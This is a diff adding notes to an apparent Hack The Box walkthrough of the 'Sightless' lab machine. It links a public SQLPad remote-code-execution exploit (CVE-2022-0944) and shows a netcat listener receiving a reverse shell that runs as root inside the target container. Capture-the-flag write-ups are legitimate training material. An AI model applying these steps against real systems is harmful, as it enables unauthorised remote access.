@@ -255,3 +255,26 @@ sales@sightless.htb
 
 sqlpad:
 ![image](https://github.com/user-attachments/assets/cb615dc1-b2d5-423c-980f-ece826eccd8e)
+
+sqlpad rce: https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944
+
+reverse shell output:
+```bash
+┌─[us-dedivip-1]─[10.10.14.34]─[bhugo97@htb-hdqjptsfjk]─[~]
+└──╼ [★]$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.34] from (UNKNOWN) [10.129.215.169] 48768
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@c184118df0a6:/var/lib/sqlpad# whoami
+whoami
+root
+root@c184118df0a6:/var/lib/sqlpad# ls -lah
+ls -lah
+total 200K
+drwxr-xr-x 4 root root 4.0K Nov 15 16:40 .
+drwxr-xr-x 1 root root 4.0K Mar 12  2022 ..
+drwxr-xr-x 2 root root 4.0K Aug  9 11:17 cache
+drwxr-xr-x 2 root root 4.0K Aug  9 11:17 sessions
+-rw-r--r-- 1 root root 184K Nov 15 18:35 sqlpad.sqlite
+```
